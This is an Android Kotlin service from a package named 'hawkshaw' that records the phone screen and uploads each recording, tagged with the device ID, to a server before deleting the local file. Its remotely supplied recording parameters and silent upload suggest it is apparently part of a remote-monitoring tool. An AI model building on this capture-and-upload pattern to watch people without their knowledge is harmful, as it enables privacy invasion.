package com.hawkshaw.library.features.screen

import android.app.Service
import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.IBinder
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import com.hawkshaw.library.App
import com.hawkshaw.library.datalayer.network.uploadScreenRecording
import com.hawkshaw.library.deviceinfo.DeviceInfo
import com.hawkshaw.library.network.ApiService
import com.hawkshaw.library.utils.NotificationKt
import kotlinx.coroutines.*
import java.io.File
import java.io.IOException

/**
 * Service for handling screen recording functionality
 */
class ScreenRecordingService : Service() {
    
    companion object {
        private const val TAG = "ScreenRecordingService"
        private const val NOTIFICATION_ID = 1001
        
        const val ACTION_START_RECORDING = "com.hawkshaw.START_SCREEN_RECORDING"
        const val ACTION_STOP_RECORDING = "com.hawkshaw.STOP_SCREEN_RECORDING"
        
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"
        const val EXTRA_QUALITY = "quality"
        const val EXTRA_DURATION = "duration"
        const val EXTRA_RESOLUTION = "resolution"
        const val EXTRA_RECORDING_ID = "recording_id"
    }
    
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var recordingFile: File? = null
    private var recordingId: String? = null
    private var startTime: Long = 0
    
    private val serviceScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "[DEBUG] onStartCommand called with action: ${intent?.action}")
        
        when (intent?.action) {
            ACTION_START_RECORDING -> {
                val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, -1)
                val resultData = intent.getParcelableExtra<Intent>(EXTRA_RESULT_DATA)
                val quality = intent.getStringExtra(EXTRA_QUALITY) ?: "medium"
                val duration = intent.getIntExtra(EXTRA_DURATION, 60)
                val resolution = intent.getStringExtra(EXTRA_RESOLUTION)
                val recordingId = intent.getStringExtra(EXTRA_RECORDING_ID) ?: generateRecordingId()
                
                if (resultCode != -1 && resultData != null) {
                    startScreenRecording(resultCode, resultData, quality, duration, resolution, recordingId)
                } else {
                    Log.e(TAG, "[ERROR] Invalid result code or data for screen recording")
                    stopSelf()
                }
            }
            ACTION_STOP_RECORDING -> {
                stopScreenRecording()
            }
        }
        
        return START_STICKY
    }
    
    private fun startScreenRecording(
        resultCode: Int,
        resultData: Intent,
        quality: String,
        duration: Int,
        resolution: String?,
        recordingId: String
    ) {
        Log.d(TAG, "[DEBUG] startScreenRecording called with quality: $quality, duration: $duration")
        
        if (isRecording) {
            Log.w(TAG, "[WARNING] Screen recording already in progress")
            return
        }
        
        try {
            this.recordingId = recordingId
            startTime = System.currentTimeMillis()
            
            // Create recording file
            val recordingsDir = File(filesDir, "screen_recordings")
            if (!recordingsDir.exists()) {
                recordingsDir.mkdirs()
            }
            
            recordingFile = File(recordingsDir, "screen_recording_${recordingId}.mp4")
            
            // Get screen dimensions
            val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val displayMetrics = DisplayMetrics()
            windowManager.defaultDisplay.getMetrics(displayMetrics)
            
            val (width, height) = parseResolution(resolution, displayMetrics)
            
            // Setup MediaRecorder
            mediaRecorder = MediaRecorder().apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setOutputFile(recordingFile!!.absolutePath)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(width, height)
                setVideoFrameRate(getFrameRate(quality))
                setVideoEncodingBitRate(getBitRate(quality, width, height))
                prepare()
            }
            
            // Get MediaProjection
            val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, resultData)
            
            // Create VirtualDisplay
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenRecording",
                width, height, displayMetrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder!!.surface,
                null, null
            )
            
            // Start recording
            mediaRecorder?.start()
            isRecording = true
            
            // Show notification
            startForeground(NOTIFICATION_ID, createRecordingNotification())
            
            Log.i(TAG, "[INFO] Screen recording started: $recordingId")
            
            // Schedule auto-stop if duration is specified
            if (duration > 0) {
                serviceScope.launch {
                    delay(duration * 1000L)
                    if (isRecording) {
                        stopScreenRecording()
                    }
                }
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "[ERROR] Failed to start screen recording", e)
            cleanup()
            stopSelf()
        }
    }
    
    private fun stopScreenRecording() {
        Log.d(TAG, "[DEBUG] stopScreenRecording called")
        
        if (!isRecording) {
            Log.w(TAG, "[WARNING] No active screen recording to stop")
            return
        }
        
        try {
            mediaRecorder?.stop()
            isRecording = false
            
            val endTime = System.currentTimeMillis()
            val duration = ((endTime - startTime) / 1000).toInt()
            
            Log.i(TAG, "[INFO] Screen recording stopped: $recordingId, duration: ${duration}s")
            
            // Upload recording to server
            recordingFile?.let { file ->
                if (file.exists() && recordingId != null) {
                    uploadRecording(file, recordingId!!, duration)
                }
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "[ERROR] Failed to stop screen recording", e)
        } finally {
            cleanup()
            stopSelf()
        }
    }
    
    private fun uploadRecording(file: File, recordingId: String, duration: Int) {
        serviceScope.launch {
            try {
                Log.d(TAG, "[DEBUG] Uploading screen recording: $recordingId")
                
                val apiService = ApiService(applicationContext)
                val deviceId = DeviceInfo.getAndroidId()
                
                // Get file info
                val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
                val displayMetrics = DisplayMetrics()
                windowManager.defaultDisplay.getMetrics(displayMetrics)
                
                val result = apiService.uploadScreenRecording(
                    file = file,
                    deviceId = deviceId,
                    recordingId = recordingId,
                    duration = duration,
                    resolution = "${displayMetrics.widthPixels}x${displayMetrics.heightPixels}",
                    startTime = startTime,
                    endTime = System.currentTimeMillis()
                )
                
                if (result.isSuccess) {
                    Log.i(TAG, "[INFO] Screen recording uploaded successfully: $recordingId")
                    // Delete local file after successful upload
                    file.delete()
                } else {
                    Log.e(TAG, "[ERROR] Failed to upload screen recording: ${result.exceptionOrNull()?.message}")
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "[ERROR] Upload error", e)
            }
        }
    }
    
    private fun cleanup() {
        try {
            virtualDisplay?.release()
            mediaProjection?.stop()
            mediaRecorder?.release()
        } catch (e: Exception) {
            Log.e(TAG, "[ERROR] Cleanup error", e)
        }
        
        virtualDisplay = null
        mediaProjection = null
        mediaRecorder = null
    }
    
    private fun parseResolution(resolution: String?, displayMetrics: DisplayMetrics): Pair<Int, Int> {
        return if (resolution != null && resolution.contains("x")) {
            val parts = resolution.split("x")
            if (parts.size == 2) {
                try {
                    Pair(parts[0].toInt(), parts[1].toInt())
                } catch (e: NumberFormatException) {
                    Pair(displayMetrics.widthPixels, displayMetrics.heightPixels)
                }
            } else {
                Pair(displayMetrics.widthPixels, displayMetrics.heightPixels)
            }
        } else {
            Pair(displayMetrics.widthPixels, displayMetrics.heightPixels)
        }
    }
    
    private fun getFrameRate(quality: String): Int {
        return when (quality) {
            "low" -> 15
            "medium" -> 30
            "high" -> 30
            "ultra" -> 60
            else -> 30
        }
    }
    
    private fun getBitRate(quality: String, width: Int, height: Int): Int {
        val pixels = width * height
        return when (quality) {
            "low" -> (pixels * 0.1).toInt()
            "medium" -> (pixels * 0.2).toInt()
            "high" -> (pixels * 0.4).toInt()
            "ultra" -> (pixels * 0.8).toInt()
            else -> (pixels * 0.2).toInt()
        }
    }
    
    private fun generateRecordingId(): String {
        return "screen_${System.currentTimeMillis()}_${(1000..9999).random()}"
    }
    
    private fun createRecordingNotification() = NotificationKt.getNotification(
        title = "Screen Recording",
        contentText = "Recording screen...",
        intent = Intent(this, App::class.java),
        context = this
    ).build()
    
    override fun onDestroy() {
        Log.d(TAG, "[DEBUG] onDestroy called")
        cleanup()
        serviceScope.cancel()
        super.onDestroy()
    }
}
